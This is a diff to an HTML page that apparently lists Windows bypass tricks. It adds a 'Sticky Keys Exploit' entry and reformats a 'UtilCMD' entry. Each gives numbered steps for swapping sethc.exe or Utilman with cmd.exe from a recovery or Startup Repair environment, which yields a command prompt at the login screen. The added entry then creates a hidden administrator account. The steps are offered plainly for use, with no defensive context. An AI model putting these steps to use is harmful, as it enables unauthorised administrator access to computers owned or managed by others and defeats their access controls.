@@ -72,6 +72,8 @@
             <br>
             <a href="#PowerEXE">PowerEXE</a>
             <br>
+            <a href="#StickyKeysExploit">Sticky Keys Exploit</a>
+            <br>
             <a href="#UtilCMD">UtilCMD</a>
         </details>
         <hr>
@@ -118,20 +120,56 @@
         </details>
         <br>
         <details>
+            <summary><b id="StickyKeysExploit">Sticky Keys Exploit</b></summary>
+            <p class="small-text">Windows 7+
+            <br>
+            Swaps Sticky Keys with an admin Command Prompt window.</p>
+            <br>
+            1: Access an admin Command Prompt/Powershell prompt. You can do this by booting into Windows PE, selecting "Advanced Options", then "Command Prompt". You can also use a Windows 10 Media Installation USB & select Next>Repair Your Computer>Troubleshoot>Command Prompt.
+            <br> 
+            2: Run “C:”.
+            <br>
+            3: Run “dir”. Keep going until you find a drive with the Windows directory (1).
+            <br>
+            4: Run “copy sethc.exe sethc.bak”.
+            <br>
+            5: Run “copy cmd.exe sethc.exe”.
+            <br>
+            6: Type "Y" to proceed.
+            <br>
+            7: Activate Sticky Keys (press Shift 5 times).
+            <br>
+            8: Run “net user (username) (password) /add”. Replace (username) & (password) with each respective thing (no parentheses).
+            <br>
+            9: Run “C:\Windows\System32\> net localgroup  administrators (username of previous command) /add”.
+            <br>
+            10: Login with the username & password you made. This account has administrator access.
+        </details>
+        <br>
+        <details>
             <summary><b id="UtilCMD">UtilCMD</b></summary>
             <p class="small-text">Windows 7+
             <br>
             Enables the Command Prompt, allowing you to run commands.</p>
             <br>
             1: Restart the computer via Power button.
+            <br>
             2: Wait for the startup screen & select "Start Windows Normally", then press enter.
+            <br>
             3: Restart via Power button again.
+            <br>
             4: Select "Launch Startup Repair". If you don't see this option, repeat steps 1-4.
+            <br>
             5: Click "Cancel" when prompted, then click the "View problem details" drop-down box.
+            <br>
             6: Select "If the online privacy statement is not available..." to open Notepad.
+            <br>
             7: In the Notepad window, open the computer's system files (system32) by clicking "Files", then "Open...".
+            <br>
             8: Change all the file types you can see.
+            <br>
             9: Replace Ultility Manager with Command Prompt by renaming the Utilman to "Utilman1", then coping the "cmd" file & renaming it "Utilman".
+            <br>
             10: Close the remaining windows, then click "Cancel" in the Startup Repair window & click "Yes" when prompted.
         </details>
     <div style="line-height:2250%;">
